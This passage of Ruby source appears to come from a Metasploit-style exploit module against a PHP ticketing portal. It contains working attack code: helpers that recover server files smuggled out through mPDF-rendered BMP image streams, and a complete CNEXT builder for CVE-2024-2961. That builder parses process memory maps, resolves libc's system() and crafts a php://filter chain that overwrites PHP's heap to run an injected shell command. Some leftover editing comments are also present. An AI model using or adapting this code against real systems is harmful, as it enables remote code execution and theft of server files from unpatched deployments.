    # Swaps byte order in every 3-byte triplet: [R,G,B] → [B,G,R].
    # This reverses the BGR→RGB conversion that mPDF performs when
    # embedding BMP pixel data into a PDF image XObject.
    #
    # @param data [String] RGB pixel data
    # @return [String] BGR pixel data
    def swap_rgb_bgr(data)
      s = data.dup.force_encoding('ASCII-8BIT')
      len = s.length
      lim = len - (len % 3)   # process only complete RGB triplets

      i = 0
      while i < lim
        # direct byte swap using getbyte / setbyte is fastest in CRuby
        r = s.getbyte(i)
        b = s.getbyte(i+2)
        s.setbyte(i,   b)
        s.setbyte(i+2, r)
        i += 3
      end
      s
    end

    # Extracts and decompresses all stream objects from raw PDF data.
    # Most PDF streams use FlateDecode (zlib).
    #
    # @param pdf_data [String] raw PDF bytes
    # @return [Array<String>] array of decompressed stream contents
    def extract_pdf_streams(pdf_data)
      streams = []
      pos = 0

      while (start_idx = pdf_data.index('stream', pos))
        data_start = start_idx + 6
        data_start += 1 if data_start < pdf_data.length && pdf_data[data_start] == "\r"
        data_start += 1 if data_start < pdf_data.length && pdf_data[data_start] == "\n"

        end_idx = pdf_data.index('endstream', data_start)
        break unless end_idx

        stream_data = pdf_data[data_start...end_idx].sub(/\r?\n?\z/, '')

        begin
          streams << Zlib::Inflate.inflate(stream_data)
        rescue Zlib::DataError, Zlib::BufError
          streams << stream_data
        end

        pos = end_idx + 9
      end

      streams
    end

    # Extracts file data from a stream containing BMP pixel data.
    # Looks for the ISO-2022-KR escape sequence marker (\x1b$)C),
    # strips null bytes, and decodes (base64 + optional zlib).
    #
    # @param raw_data [String] raw stream bytes
    # @return [String, nil] extracted file content, or nil
    def extract_data_from_bmp_stream(raw_data)
      marker = "\x1b$)C".b
      idx = raw_data.index(marker)
      unless idx
        # Not a BMP stream with our marker - this is expected for most PDF streams
        return nil
      end

      vprint_status("extract_data_from_bmp_stream: ISO-2022-KR marker found at offset #{idx} in #{raw_data.length}-byte stream")
      data = raw_data[(idx + marker.length)..].gsub("\x00".b, ''.b)
      if data.empty?
        vprint_warning('extract_data_from_bmp_stream: No data after marker (empty after null-strip)')
        return nil
      end
      vprint_status("extract_data_from_bmp_stream: #{data.length} bytes after marker (nulls stripped)")

      # Add this block here: Preview the data to see if it's base64 or plain text
      preview_len = 96
      preview = data[0, preview_len]
      vprint_status("First #{preview_len} bytes of data after marker and null-strip:")
      vprint_status("  ascii: #{preview.gsub(/[^\x20-\x7e]/, '.').inspect}")
      vprint_status("  hex:   #{preview.unpack1('H*').scan(/../).join(' ')}")

      # Add this: Check if it looks like base64
      def looks_like_base64?(str)
        return false if str.length < 12 || str.length % 4 != 0
        cleaned = str.tr('A-Za-z0-9+/=', '')
        cleaned.empty?
      end

      vprint_status("Data looks like base64? #{looks_like_base64?(data)}")

      # Conditional processing based on whether it's base64
      if looks_like_base64?(data)
        b64_decoded = decode_b64_permissive(data)
        vprint_status("extract_data_from_bmp_stream: b64 decoded=#{b64_decoded.length} bytes")

        # Preview decoded if successful
        if b64_decoded.length > 0
          dec_preview = b64_decoded[0, 96]
          vprint_status("First 96 bytes of b64_decoded:")
          vprint_status("  ascii: #{dec_preview.gsub(/[^\x20-\x7e]/, '.').inspect}")
          vprint_status("  hex:   #{dec_preview.unpack1('H*').scan(/../).join(' ')}")
        end

        decompressed = decompress_raw_deflate(b64_decoded)
        vprint_status("extract_data_from_bmp_stream: zlib decompressed=#{decompressed.length} bytes")

        # Preview decompressed if any
        if decompressed.length > 0
          zlib_preview = decompressed[0, 96]
          vprint_status("First 96 bytes of decompressed:")
          vprint_status("  ascii: #{zlib_preview.gsub(/[^\x20-\x7e]/, '.').inspect}")
          vprint_status("  hex:   #{zlib_preview.unpack1('H*').scan(/../).join(' ')}")
        end

        return decompressed unless decompressed.empty?
        return b64_decoded unless b64_decoded.empty?
      else
        # For plain, preview the data itself
        vprint_status("Treating as plain (non-base64) - preview:")
        vprint_status("  ascii: #{data[0, 96].gsub(/[^\x20-\x7e]/, '.').inspect}")
        vprint_status("  hex:   #{data[0, 96].unpack1('H*').scan(/../).join(' ')}")
      end
      data
    end

    # Best-effort base64 decoding in 4-byte blocks. Falls back to cleaning
    # the input as printable ASCII if decoded output is below min_bytes
    # (indicating the data was probably plaintext, not base64).
    #
    # @param data      [String] raw bytes to decode
    # @param min_bytes [Integer] minimum decoded length to consider valid
    # @return [String] decoded bytes or cleaned plaintext
    def decode_b64_permissive(data, min_bytes = 12)
      data = data.strip
      decoded = ''.b
      i = 0

      while i < data.length
        block = data[i, 4]
        # Stop at non-base64 characters (matches Python's validate=True behavior)
        break unless block.match?(/\A[A-Za-z0-9+\/=]+\z/)
        begin
          decoded << Rex::Text.decode_base64(block)
        rescue StandardError
          break
        end
        i += 4
      end

      decoded.length < min_bytes ? clean_unprintable_bytes(data) : decoded
    end

    # Decompresses raw deflate data (no zlib header) in chunks, tolerating
    # truncated or corrupted streams.
    #
    # @param data       [String] raw deflate-compressed bytes
    # @param chunk_size [Integer] decompression chunk size
    # @return [String] decompressed bytes (may be partial)
    def decompress_raw_deflate(data, chunk_size = 1024)
      return ''.b if data.nil? || data.empty?

      inflater = Zlib::Inflate.new(-Zlib::MAX_WBITS)
      output = ''.b
      i = 0

      while i < data.length
        begin
          output << inflater.inflate(data[i, chunk_size])
        rescue Zlib::DataError, Zlib::BufError
          output << inflater.flush_next_out rescue nil
          break
        end
        i += chunk_size
      end

      output << inflater.finish rescue nil
      inflater.close
      output
    end

    # Strips non-printable ASCII characters, keeping 0x20-0x7E and whitespace.
    #
    # @param data [String] raw bytes
    # @return [String] cleaned ASCII bytes
    def clean_unprintable_bytes(data)
      data.encode('ASCII', invalid: :replace, undef: :replace, replace: '')
          .gsub(/[^\x20-\x7E\n\r\t]/, '').b
    end

    # ─────────────────────────────────────────────────────────
    # CNEXT: Memory Layout Analysis
    # ─────────────────────────────────────────────────────────

    # Parses /proc/self/maps content into structured memory region entries.
    #
    # @param maps_content [String] raw contents of /proc/self/maps
    # @return [Array<Hash>] array of { start:, stop:, perms:, path:, size: }
    def cnext_parse_proc_maps(maps_content)
      pattern = /^([0-9a-f]+)-([0-9a-f]+)\s+([-rwxps]{4})\s+\S+\s+\S+\s+\S+\s*(.*)/
      regions = []

      maps_content.each_line do |line|
        match = line.strip.match(pattern)
        next unless match

        start_addr = match[1].to_i(16)
        stop_addr  = match[2].to_i(16)
        path = match[4].strip
        path = '' unless path.include?('/') || path.include?('[')

        regions << {
          start: start_addr,
          stop: stop_addr,
          perms: match[3],
          path: path,
          size: stop_addr - start_addr
        }
      end

      regions
    end

    # Finds the first memory region whose path contains any of the given names.
    #
    # @param regions [Array<Hash>] parsed memory regions
    # @param names   [Array<String>] substrings to match against region paths
    # @return [Hash, nil] matching region or nil
    def cnext_find_region(regions, *names)
      regions.find { |r| names.any? { |n| r[:path].include?(n) } }
    end

    # Locates PHP's main zend_mm_heap in the process memory map.
    # Searches for anonymous RW regions >= 2MB aligned on 2MB boundary.
    #
    # @param regions [Array<Hash>] parsed memory regions
    # @return [Integer, nil] heap address (base of zend_mm_heap)
    def cnext_find_main_heap(regions)
      candidates = regions.select do |r|
        r[:perms] == 'rw-p' &&
          r[:size] >= CNEXT_HEAP_SIZE &&
          (r[:stop] & (CNEXT_HEAP_SIZE - 1)).zero? &&
          (r[:path].empty? || r[:path] == '[anon:zend_alloc]')
      end
      return nil if candidates.empty?

      # Heap is at the bottom of the region
      candidates.last[:stop] - CNEXT_HEAP_SIZE + 0x40
    end

    # ─────────────────────────────────────────────────────────
    # CNEXT: ELF Parsing & Libc Symbol Resolution
    # ─────────────────────────────────────────────────────────

    # Extracts the GNU Build ID from ELF binary data.
    #
    # @param elf_data [String] raw ELF binary data (may be partial)
    # @return [String, nil] hex-encoded build ID, or nil
    def cnext_extract_build_id(elf_data)
      gnu_name = "GNU\x00".b
      pos = 0

      while (name_offset = elf_data.index(gnu_name, pos))
        header_offset = name_offset - 12
        if header_offset < 0
          pos = name_offset + 1
          next
        end

        n_namesz, n_descsz, n_type = elf_data[header_offset, 12].unpack('VVV') rescue nil
        unless n_namesz
          pos = name_offset + 1
          next
        end

        if n_namesz == 4 && n_type == 3 # NT_GNU_BUILD_ID
          build_id_data = elf_data[name_offset + n_namesz, n_descsz]
          return build_id_data.unpack1('H*') if build_id_data
        end

        pos = name_offset + 1
      end

      nil
    end

    # Parses an ELF64 little-endian binary's .dynsym section to resolve symbols.
    #
    # @param elf_data     [String] full ELF binary data
    # @param symbol_names [Array<String>] symbol names to look up
    # @return [Hash{String => Integer}] symbol name to offset within ELF
    def cnext_parse_elf_symbols(elf_data, *symbol_names)
      return {} if elf_data.nil? || elf_data.length < 64
      return {} unless elf_data[0, 4] == "\x7fELF"
      return {} unless elf_data[4].ord == 2 && elf_data[5].ord == 1 # ELF64 LE

      e_shoff     = elf_data[40, 8].unpack1('Q<')
      e_shentsize = elf_data[58, 2].unpack1('v')
      e_shnum     = elf_data[60, 2].unpack1('v')
      e_shstrndx  = elf_data[62, 2].unpack1('v')

      return {} if e_shoff.zero? || e_shnum.zero?
      return {} if e_shoff + e_shnum * e_shentsize > elf_data.length

      # Section header string table
      shstrtab_hdr = elf_data[e_shoff + e_shstrndx * e_shentsize, e_shentsize]
      shstrtab_off = shstrtab_hdr[24, 8].unpack1('Q<')
      shstrtab_sz  = shstrtab_hdr[32, 8].unpack1('Q<')
      shstrtab = elf_data[shstrtab_off, shstrtab_sz]

      dynsym_hdr = dynstr_hdr = nil
      e_shnum.times do |i|
        sh = elf_data[e_shoff + i * e_shentsize, e_shentsize]
        sh_name_idx = sh[0, 4].unpack1('V')
        sh_type     = sh[4, 4].unpack1('V')
        name = shstrtab[sh_name_idx..].to_s.split("\x00", 2).first

        dynsym_hdr = sh if name == '.dynsym' && sh_type == 11
        dynstr_hdr = sh if name == '.dynstr' && sh_type == 3
      end
      return {} unless dynsym_hdr && dynstr_hdr

      dynsym_off = dynsym_hdr[24, 8].unpack1('Q<')
      dynsym_sz  = dynsym_hdr[32, 8].unpack1('Q<')
      dynsym_ent = dynsym_hdr[56, 8].unpack1('Q<')
      dynsym_ent = 24 if dynsym_ent.zero?

      dynstr_off = dynstr_hdr[24, 8].unpack1('Q<')
      dynstr_sz  = dynstr_hdr[32, 8].unpack1('Q<')
      dynstr = elf_data[dynstr_off, dynstr_sz]

      results = {}
      (dynsym_sz / dynsym_ent).times do |i|
        sym = elf_data[dynsym_off + i * dynsym_ent, dynsym_ent]
        st_name  = sym[0, 4].unpack1('V')
        st_value = sym[8, 8].unpack1('Q<')
        name = dynstr[st_name..].to_s.split("\x00", 2).first

        results[name] = st_value if symbol_names.include?(name) && st_value != 0
      end

      results
    end

    # Resolves __libc_malloc, __libc_system, and __libc_realloc from libc ELF data.
    #
    # @param libc_data [String] full libc ELF binary
    # @param libc_base [Integer] runtime base address of libc
    # @return [Hash, nil] { malloc:, system:, realloc: } absolute addresses
    def cnext_resolve_libc_offsets(libc_data, libc_base)
      symbols = cnext_parse_elf_symbols(
        libc_data,
        '__libc_malloc', '__libc_system', '__libc_realloc'
      )

      missing = %w[__libc_malloc __libc_system __libc_realloc] - symbols.keys
      return nil unless missing.empty?

      {
        malloc:  libc_base + symbols['__libc_malloc'],
        system:  libc_base + symbols['__libc_system'],
        realloc: libc_base + symbols['__libc_realloc']
      }
    end

    # ─────────────────────────────────────────────────────────
    # CNEXT: Encoding Helpers
    # ─────────────────────────────────────────────────────────

    # Wraps data in HTTP chunked transfer-encoding format. If size is given,
    # the chunk header is zero-padded to make the total exactly `size` bytes.
    #
    # @param data [String] chunk body
    # @param size [Integer, nil] target total size
    # @return [String] chunked representation
    def cnext_chunked_chunk(data, size = nil)
      size = data.length + 8 if size.nil?
      keep = data.length + 2 # two \n delimiters
      hex_len = data.length.to_s(16).rjust(size - keep, '0')
      "#{hex_len}\n".b + data + "\n".b
    end

    # Creates a 0x8000-byte bucket for use with the dechunk filter.
    #
    # @param data [String] payload data
    # @return [String] compressed bucket
    def cnext_compressed_bucket(data)
      cnext_chunked_chunk(data, 0x8000)
    end

    # Emulates PHP's quoted-printable-encode: every byte becomes =XX.
    #
    # @param data [String] binary data
    # @return [String] QP-encoded representation
    def cnext_qpe(data)
      data.bytes.map { |b| format('=%02X', b) }.join.b
    end

    # Packs 64-bit pointers through the CNEXT encoding pipeline
    # (QP encode -> triple chunked -> compressed bucket).
    #
    # @param ptrs [Array<Integer>] 64-bit pointer values
    # @param size [Integer, nil] expected total byte size
    # @return [String] encoded pointer bucket
    def cnext_ptr_bucket(*ptrs, size: nil)
      if size
        raise ArgumentError, "ptr count mismatch" unless ptrs.length * 8 == size
      end

      bucket = ptrs.pack('Q<*')
      bucket = cnext_qpe(bucket)
      bucket = cnext_chunked_chunk(bucket)
      bucket = cnext_chunked_chunk(bucket)
      bucket = cnext_chunked_chunk(bucket)
      cnext_compressed_bucket(bucket)
    end

    # Compresses data for PHP's zlib.inflate filter (raw deflate, no header).
    #
    # @param data [String] data to compress
    # @return [String] raw deflate data
    def cnext_compress(data)
      Zlib::Deflate.deflate(data, 9)[2..-5]
    end

    # ─────────────────────────────────────────────────────────
    # CNEXT: Exploit Path Builder
    # ─────────────────────────────────────────────────────────

    # Builds the complete CNEXT PHP filter chain URI that exploits
    # CVE-2024-2961 to overwrite zend_mm_heap and achieve RCE.
    #
    # The exploit works in 5 steps:
    #   Step 0: Decompress and dechunk to set up heap allocations
    #   Step 1: Allocate chunks to reverse the freelist order
    #   Step 2: Write a fake freelist pointer into a chunk
    #   Step 3: Trigger iconv buffer overflow (UTF-8 -> ISO-2022-CN-EXT)
    #   Step 4: Allocate at controlled address, overwrite zend_mm_heap
    #           free_slot[] and custom_heap to redirect efree -> system()
    #
    # @param command    [String] shell command to execute
    # @param heap_addr  [Integer] address of PHP's zend_mm_heap
    # @param libc_addrs [Hash] { malloc:, system:, realloc: } absolute addresses
    # @param pad_count  [Integer] padding chunk count (default 20)
    # @return [String] the php://filter/... data: URI
    def cnext_build_exploit_path(command, heap_addr, libc_addrs, pad_count = 20)
      addr_emalloc  = libc_addrs[:malloc]
      addr_efree    = libc_addrs[:system]  # efree -> system() for RCE
      addr_erealloc = libc_addrs[:realloc]

      addr_free_slot   = heap_addr + CNEXT_OFFSET_FREE_SLOT
      addr_custom_heap = heap_addr + CNEXT_OFFSET_CUSTOM_HEAP
      addr_fake_bin    = addr_free_slot - 0x10

      cs = CNEXT_CHUNK_SIZE

      # ── Pad: fill heap to ensure contiguous ordered allocations ──
      pad_size = cs - 0x18
      pad = ("\x00" * pad_size).b
      pad = cnext_chunked_chunk(pad, pad.length + 6)
      pad = cnext_chunked_chunk(pad, pad.length + 6)
      pad = cnext_chunked_chunk(pad, pad.length + 6)
      pad = cnext_compressed_bucket(pad)

      # ── Step 1: Reverse freelist order ──
      step1 = "\x00".b
      step1 = cnext_chunked_chunk(step1)
      step1 = cnext_chunked_chunk(step1)
      step1 = cnext_chunked_chunk(step1, cs)
      step1 = cnext_compressed_bucket(step1)

      # ── Step 2: Place fake freelist pointer ──
      step2_size = 0x48
      step2 = ("\x00" * (step2_size + 8)).b
      step2 = cnext_chunked_chunk(step2, cs)
      step2 = cnext_chunked_chunk(step2)
      step2 = cnext_compressed_bucket(step2)

      # "0\n" prefix protects this chunk from ISO-2022-CN-EXT conversion
      step2_write_ptr = "0\n".b.ljust(step2_size, "\x00".b) + [addr_fake_bin].pack('Q<')
      step2_write_ptr = cnext_chunked_chunk(step2_write_ptr, cs)
      step2_write_ptr = cnext_chunked_chunk(step2_write_ptr)
      step2_write_ptr = cnext_compressed_bucket(step2_write_ptr)

      # ── Step 3: Trigger iconv buffer overflow ──
      step3 = ("\x00" * cs).b
      step3 = cnext_chunked_chunk(step3)
      step3 = cnext_chunked_chunk(step3)
      step3 = cnext_chunked_chunk(step3)
      step3 = cnext_compressed_bucket(step3)

      step3_overflow = ("\x00" * (cs - CNEXT_BUG.length) + CNEXT_BUG).b
      step3_overflow = cnext_chunked_chunk(step3_overflow)
      step3_overflow = cnext_chunked_chunk(step3_overflow)
      step3_overflow = cnext_chunked_chunk(step3_overflow)
      step3_overflow = cnext_compressed_bucket(step3_overflow)

      # ── Step 4: Overwrite zend_mm_heap ──
      step4 = ("=00" + "\x00" * (cs - 1)).b
      step4 = cnext_chunked_chunk(step4)
      step4 = cnext_chunked_chunk(step4)
      step4 = cnext_chunked_chunk(step4)
      step4 = cnext_compressed_bucket(step4)

      # Overwrite free_slot[] - allocated 0x10 before data, hence two fillers
      step4_pwn = cnext_ptr_bucket(
        0x200000, 0,             # filler (0x10 before actual free_slot)
        0, 0,                    # free_slot[0], free_slot[1]
        addr_custom_heap,        # free_slot[2] -> next alloc lands at custom_heap
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
        heap_addr,               # free_slot[17] (offset 0x140)
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
        size: cs
      )

      # Overwrite custom_heap function pointers
      step4_custom_heap = cnext_ptr_bucket(
        addr_emalloc, addr_efree, addr_erealloc,
        size: 0x18
      )

      # Command string + use_custom_heap activation
      step4_uch_size = 0x140
      cmd_str = "kill -9 $PPID; #{command}\x00".b
      raise ArgumentError, "Command too long (#{cmd_str.length} > #{step4_uch_size})" if cmd_str.length > step4_uch_size

      cmd_str = cmd_str.ljust(step4_uch_size, "\x00".b)
      step4_uch = cnext_qpe(cmd_str)
      step4_uch = cnext_chunked_chunk(step4_uch)
      step4_uch = cnext_chunked_chunk(step4_uch)
      step4_uch = cnext_chunked_chunk(step4_uch)
      step4_uch = cnext_compressed_bucket(step4_uch)

      # ── Assemble all pages ──
      pages = ''.b
      pages << step4 * 3
      pages << step4_pwn
      pages << step4_custom_heap
      pages << step4_uch
      pages << step3_overflow
      pages << pad * pad_count
      pages << step1 * 3
      pages << step2_write_ptr
      pages << step2 * 2

      # Double-compress and encode as data: URI
      resource = cnext_compress(cnext_compress(pages))
      resource_b64 = Rex::Text.encode_base64(resource)

      filters = [
        'zlib.inflate',
        'zlib.inflate',
        'dechunk', 'convert.iconv.L1.L1',                   # Step 0
        'dechunk', 'convert.iconv.L1.L1',                   # Step 1
        'dechunk', 'convert.iconv.L1.L1',                   # Step 2
        'dechunk', 'convert.iconv.UTF-8.ISO-2022-CN-EXT',   # Step 3
        'convert.quoted-printable-decode', 'convert.iconv.L1.L1' # Step 4
      ]

      "php://filter/read=#{filters.join('|')}/resource=data:text/plain;base64,#{resource_b64}"
    end

    private

    # Detects the reply textarea field name from the ticket page HTML.
    #
    # @param html   [String] ticket page HTML
    # @param prefix [String] portal prefix ('/scp' or '')
    # @return [String] textarea field name
    def detect_reply_textarea(html, prefix)
      [
        /name="([^"]+)"[^>]*id="response"/i,
        /id="response"[^>]*name="([^"]+)"/i,
        /name="([^"]+)"[^>]*id="message"/i,
        /id="message"[^>]*name="([^"]+)"/i,
        /name="(response)"/
      ].each do |pattern|
        match = html.match(pattern)
        return match[1] if match
      end
      prefix == '/scp' ? 'response' : 'message'
    end

  end
end
